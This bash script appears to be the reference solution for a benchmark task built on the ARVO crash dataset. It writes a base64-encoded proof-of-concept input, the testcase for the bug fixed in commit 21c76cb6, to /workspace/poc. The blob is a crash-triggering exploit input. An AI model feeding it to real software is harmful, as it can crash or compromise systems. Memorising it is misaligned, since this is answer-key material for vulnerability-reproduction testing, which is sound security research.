#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit 21c76cb6 addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
AAAAAAAAAAAEAQAAAAAAARMAAAAAAAAAAAHDUAAACMJg/1UAAQMiUABISDF/vwfbPAAAv5Ew2woAAAI8AAAAAURQAAC/vyL8/wDCYAjCYP8AvwLVAAABAQIAAP/3MKQBxaYAWyv83NzcEAAAAUIIAAYOAAAAMKQBoSAAAKEgxaYAWyvcKJKSkpKSkpKS3NwgqUsuAMUA/0Ia/wAAAcUA//8BK6RVAKFvwsJUv29QAAAAAAAAAAABQgAAAUIggScPAAAAMKQJoSD+AKEgxaYAoSvc2/4AAAABKysrrq6urq6u7QAAAAErKysrKysAAAAAAAAAAAAAAAAAAAA=
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
